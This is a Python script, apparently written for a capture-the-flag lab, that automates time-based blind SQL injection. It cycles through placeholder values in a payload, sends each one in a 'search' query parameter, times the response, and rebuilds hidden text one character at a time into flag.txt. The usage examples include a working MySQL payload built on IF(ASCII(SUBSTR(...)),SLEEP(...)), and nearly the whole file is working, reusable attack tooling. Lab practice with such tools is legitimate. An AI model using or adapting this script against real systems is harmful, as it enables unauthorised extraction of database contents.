#!/usr/bin/env python3
"""
flexible_blind.py

Usage examples:
  # Example: position 1..37, ascii 0..122, fixed sleep=5
  python3 flexible_blind.py \
    --url "https://example.com/" \
    --payload "|| IF(ASCII(SUBSTR((SELECT flag_text FROM flag),{$},1))={$},SLEEP({$}),0)%23\\" \
    --var "1-37" --var "0-122" --var "5" \
    --pos-index 1 --char-index 2 \
    --positions 37 \
    --threshold 4.0 --delay-between 0.15

  # Example: test only pos 5
  python3 flexible_blind.py --url "https://example.com/" \
    --payload "...{$}...{$}...{$}..." --var "5" --var "0-122" --var "5" --pos-index 1 --char-index 2

  # Example:
  python3 blind_sqli2.py --url "https://qry9mna9o2.voorivex-lab.online/" 
  --payload "||+IF(ASCII(SUBSTR((SELECT+flag_text+FROM+flag),{$},1))={$},SLEEP({$}),0)%23+\ "
  --var "6-6" --var "0-255" --var "5" --pos-index 1 --char-index 2 --positions 37


Notes:
 - --var can be:
     * single number: "5"
     * range: "1-37"
     * comma list: "a,b,c" or "36,37,38" or special chars like "$,#,%,!"
 - placeholders in payload must be the literal string: {$}
 - the script replaces placeholders sequentially left-to-right.
 - file output: flag.txt updated as "flag:(...)" — ? for unknown positions.


"""

import argparse, time, os, sys
from urllib.parse import quote_plus, urlparse, urlunparse
import requests
import itertools

# ---------- helper parsers ----------
def parse_variant_token(tok):
    tok = tok.strip()
    # range A-B
    if '-' in tok and len(tok.split('-')) == 2 and all(x.strip().lstrip('-').isdigit() for x in tok.split('-')):
        a,b = tok.split('-')
        a=int(a); b=int(b)
        return list(range(a, b+1))
    # comma list
    if ',' in tok:
        parts = [p.strip() for p in tok.split(',') if p.strip()!='']
        vals = []
        for p in parts:
            # numeric?
            if p.lstrip('-').isdigit():
                vals.append(int(p))
            else:
                # treat as char(s) — allow escaping like \, or multi-char token as sequence of chars
                # if length > 1, break into characters
                if len(p) == 1:
                    vals.append(p)
                else:
                    # multi-char token -> push as whole token (rare), but main use is single chars like %
                    vals.append(p)
        return vals
    # single number?
    if tok.lstrip('-').isdigit():
        return [int(tok)]
    # otherwise it's probably a single char token
    if len(tok) > 0:
        return list(tok) if len(tok) > 1 else [tok]
    return []

def build_variant_list(var_specs):
    # var_specs: list of strings passed via --var in order
    lists = []
    for s in var_specs:
        lists.append(parse_variant_token(s))
    return lists

# ---------- payload operations ----------
def count_placeholders(payload):
    return payload.count('{$}')

def replace_placeholders(payload, values):
    # values: list of replacements in order
    out = payload
    for v in values:
        # if v is int -> insert as number, if v is str and length>1 may need quoting? we insert raw
        rep = str(v)
        out = out.replace('{$}', rep, 1)
    return out

def url_with_payload(base_url, payload_raw):
    enc = quote_plus(payload_raw, safe='')
    p = urlparse(base_url)
    if p.query:
        new_query = p.query + "&search=" + enc
    else:
        new_query = "search=" + enc
    newp = p._replace(query=new_query)
    return urlunparse(newp)

# ---------- file handling ----------
def load_existing_flag_file(path, expected_len):
    if not os.path.exists(path):
        return ['?'] * expected_len
    txt = open(path, 'r', encoding='utf-8').read().strip()
    # try to parse between parentheses
    if 'flag:' in txt and '(' in txt and ')' in txt:
        inside = txt.split('(',1)[1].rsplit(')',1)[0]
        # take raw characters as list
        chars = list(inside)
        # pad or cut to expected_len
        if len(chars) < expected_len:
            chars += ['?'] * (expected_len - len(chars))
        elif len(chars) > expected_len:
            chars = chars[:expected_len]
        return chars
    else:
        # fallback: create empty
        return ['?'] * expected_len

def write_flag_file(path, char_list):
    s = "".join(c if c is not None else '?' for c in char_list)
    with open(path, 'w', encoding='utf-8') as f:
        f.write(f"flag:({s})\n")

# ---------- main attacker logic ----------
def main():
    parser = argparse.ArgumentParser(description="Flexible blind/time-based extractor with {$} placeholders")
    parser.add_argument("--url", required=True, help="Base URL (no ?search=). e.g. https://example.com/")
    parser.add_argument("--payload", required=True, help="Payload template with {$} placeholders (readable, unencoded).")
    parser.add_argument("--var", action='append', required=True, help="Variable spec for each {$} in order. Use multiple times. Each can be 'A-B' or 'N' or 'x,y,z' or characters. Example: --var 1-37 --var 32-126 --var 5")
    parser.add_argument("--pos-index", type=int, default=1, help="Which variable index (1-based) corresponds to position/index in the flag (default 1)")
    parser.add_argument("--char-index", type=int, default=2, help="Which variable index (1-based) corresponds to tested char/ascii (default 2)")
    parser.add_argument("--positions", type=int, default=None, help="Total positions expected (optional; if provided used to size flag file). If not, inferred from pos range length if available.")
    parser.add_argument("--threshold", type=float, default=4.0, help="Time threshold (seconds) to consider a match")
    parser.add_argument("--delay-between", type=float, default=0.15, help="Delay between requests (s)")
    parser.add_argument("--timeout", type=int, default=20, help="HTTP request timeout (s)")
    parser.add_argument("--retries", type=int, default=1, help="Retries per tested value when time is near threshold (default 1 = no retry)")
    parser.add_argument("--out", default="flag.txt", help="Output file (default flag.txt)")
    parser.add_argument("--verbose", action="store_true")
    args = parser.parse_args()

    # parse payload and placeholders
    payload = args.payload
    ph_count = count_placeholders(payload)
    var_specs = args.var
    if len(var_specs) != ph_count:
        print(f"[!] payload contains {ph_count} {{$}} placeholders but you passed {len(var_specs)} --var arguments.")
        print("    Provide one --var for each {$} in your payload (in left-to-right order).")
        sys.exit(1)

    variants = build_variant_list(var_specs)
    if any(len(v)==0 for v in variants):
        print("[!] One of your --var specifications produced an empty list. Check syntax.")
        sys.exit(1)

    # interpret pos/char indexes (1-based)
    pos_idx = args.pos_index - 1
    char_idx = args.char_index - 1
    if not (0 <= pos_idx < ph_count and 0 <= char_idx < ph_count):
        print("[!] pos-index or char-index out of range of placeholders")
        sys.exit(1)

    # derive positions count
    if args.positions is not None:
        total_positions = args.positions
    else:
        # if pos var is a numeric list, use its length and max
        pos_list = variants[pos_idx]
        # if elements are ints, and contiguous, maybe we want max-min+1; simpler: use max value if ints
        if all(isinstance(x, int) for x in pos_list):
            total_positions = max(pos_list) if pos_list else 0
        else:
            total_positions = len(pos_list)

    # load / init output file
    found = load_existing_flag_file(args.out, total_positions)
    if args.verbose:
        print("[*] initial flag buffer:", "".join(found))

    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (compatible; extractor/1.0)"})

    # prepare iteration order: we will iterate over pos-values outermost if pos var is numeric sequence
    # create mapping of var index -> iterable
    iterables = variants

    # convenience: if char list elements are integers > 0 they represent ascii codes; if strings are single chars, we use them directly
    def to_printable_token(val):
        if isinstance(val, int):
            if 32 <= val <= 126:
                return chr(val)
            else:
                return f"\\x{val:02x}"
        else:
            return str(val)

    # create list of pos_values if numeric else index positions mapping
    pos_values = iterables[pos_idx]
    # If pos_values are chars (unlikely), we map indexes 1..positions to them
    if not all(isinstance(x, int) for x in pos_values):
        # fallback: use indices 1..total_positions
        pos_values = list(range(1, total_positions+1))

    print(f"[*] Target: {args.url}")
    print(f"[*] Payload placeholders: {ph_count}, variables lists lengths: {[len(v) for v in iterables]}")
    print(f"[*] Positions to probe based on var{pos_idx+1}: {pos_values[:10]}{'...' if len(pos_values)>10 else ''} (total {len(pos_values)})")
    print(f"[*] Output file: {args.out}")
    print("[*] Starting probing loop (press Ctrl+C to stop)")

    try:
        # outer loop: iterate over pos values in provided order
        for pos_val in pos_values:
            # determine index number to record (if pos list is contiguous range like 1..N use that number)
            pos_index_number = int(pos_val) if isinstance(pos_val, int) else None
            # if we already have a character recorded for this position, skip or continue? we will skip only if not '?'
            if pos_index_number is not None and 1 <= pos_index_number <= total_positions and found[pos_index_number-1] != '?':
                if args.verbose:
                    print(f"[*] pos {pos_index_number} already known as '{found[pos_index_number-1]}', skipping.")
                continue

            print(f"\n[*] Probing position {pos_val} ...")
            matched_char = None
            # prepare iterators for other variables: we need to create full cartesian product of variables,
            # but we will vary char variable inner-most typically. We'll create nested loops by product of all var lists,
            # but we override pos var with current pos_val to avoid duplicating loops.
            lists_for_product = []
            for vi, lst in enumerate(iterables):
                if vi == pos_idx:
                    lists_for_product.append([pos_val])
                else:
                    lists_for_product.append(lst)

            # iterate over Cartesian product
            for combo in itertools.product(*lists_for_product):
                # combo is tuple of length ph_count, matching placeholders left-to-right
                # but note: char value might be int (ascii) or a string
                # if char variable is int it's testing ascii; if it's a string we will insert char token directly
                # build payload raw
                payload_raw = replace_placeholders(payload, combo)
                full_url = url_with_payload(args.url, payload_raw)
                if args.verbose:
                    print("  -> trying:", combo, "url:", full_url)
                # send request and time it, with retries if near threshold
                cur_try = 0
                measured = 0.0
                status = None
                while cur_try < max(1, args.retries):
                    start_t = time.time()
                    try:
                        r = session.get(full_url, timeout=args.timeout)
                        elapsed = time.time() - start_t
                        status = r.status_code
                    except Exception as e:
                        elapsed = time.time() - start_t
                        if args.verbose:
                            print("    request exception:", e)
                    measured = elapsed if cur_try == 0 else (measured + elapsed) / 2.0
                    cur_try += 1
                    # small sleep between retries
                    if cur_try < args.retries:
                        time.sleep(0.1)
                if args.verbose:
                    print(f"    time={measured:.3f}s status={status}")
                if measured >= args.threshold:
                    # match!
                    # determine printable char from the char-index value
                    char_val = combo[char_idx]
                    if isinstance(char_val, int):
                        printable = to_printable_token(char_val)
                    else:
                        # char_val may be string token; if it's length 1, use it, otherwise show whole token
                        if len(str(char_val)) == 1:
                            printable = char_val
                        else:
                            printable = str(char_val)
                    print(f"  [+] match at pos {pos_val} -> {printable} (combo={combo}) time={measured:.3f}s")
                    matched_char = printable
                    # update found buffer if pos_index known
                    if pos_index_number is not None and 1 <= pos_index_number <= total_positions:
                        found[pos_index_number-1] = printable
                        write_flag_file(args.out, found)
                        print(f"  [*] wrote/update {args.out}")
                    break

                # polite delay between attempts
                time.sleep(args.delay_between)

            if matched_char is None:
                print(f"  [-] no match found for position {pos_val} in given char range(s)")
                # leave '?' in buffer and write file so progress is recorded
                if pos_index_number is not None and 1 <= pos_index_number <= total_positions:
                    write_flag_file(args.out, found)

    except KeyboardInterrupt:
        print("\n[!] interrupted by user, saving progress...")
        write_flag_file(args.out, found)

    print("\n[*] Done. Final buffer:")
    print("".join(found))
    print(f"[*] Output file: {args.out}")

if __name__ == "__main__":
    main()
